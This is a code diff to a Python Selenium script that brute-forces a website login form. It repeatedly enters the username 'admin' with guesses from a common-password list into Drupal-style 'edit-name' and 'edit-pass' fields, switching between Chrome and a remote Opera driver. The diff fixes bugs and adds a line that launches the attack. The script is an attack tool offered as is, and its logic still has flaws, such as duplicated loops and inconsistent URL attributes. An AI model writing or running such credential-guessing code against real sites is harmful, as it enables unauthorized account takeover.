@@ -1,5 +1,6 @@
 # -*- coding:utf-8 -*-
 from selenium import webdriver
+from selenium.webdriver.chrome import service
 from selenium.webdriver.common.keys import Keys
 from time import sleep
 import threading
@@ -24,15 +25,16 @@ william, corvette, jackson, tigger, computer')
             self.urls = url
             self.login = login
         
-    def PasswordChekers(self,keys):
+    def PasswordChekers(self):
         super
         keys = Driver.keys.split(', ')
         print (keys)
-        self.driver.get(self.url)
+        
         for i in keys:
             for j in range(0,len(keys)):
-                if key[j]%2 == 0:
+                if j%2 == 0:
                     driver = webdriver.Chrome()
+                    driver.get(self.urls)
                     elem = driver.find_element_by_id("edit-name")
                     elem.send_keys(self.login)
                     elem_2 = driver.find_element_by_id("edit-pass")
@@ -42,7 +44,10 @@ william, corvette, jackson, tigger, computer')
                     sleep(1)
                     driver.close()
                 else:
-                    driver = webdriver.FireFox()
+                    webdriver_service = service.Service()
+                    webdriver_service.start()
+                    driver = webdriver.Remote(webdriver_service.service_url, webdriver.DesiredCapabilities.OPERA)
+                    driver.get(self.url)
                     elem = driver.find_element_by_id("edit-name")
                     elem.send_keys(self.login)
                     elem_2 = driver.find_element_by_id("edit-pass")
@@ -55,3 +60,4 @@ william, corvette, jackson, tigger, computer')
     
 
 instance = Driver('url','admin')
+instance.PasswordChekers()
